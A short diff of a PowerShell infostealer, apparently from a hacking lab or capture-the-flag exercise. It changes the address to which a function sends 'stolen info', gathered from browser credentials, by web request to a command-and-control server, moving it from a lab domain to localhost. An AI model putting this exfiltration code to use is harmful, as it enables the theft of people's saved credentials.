@@ -46,7 +46,7 @@ function Search-ForBrowserCredentials {
 
 # Function to send the stolen info to a C2 server
 function Send-InfoToC2Server {
-    $c2Url = "http://papash3ll.thm/data"
+    $c2Url = "http://127.0.0.1:5000/"
     $data = Get-Content -Path $infoFilePath -Raw
 
     # Using Invoke-WebRequest to send data to the C2 server
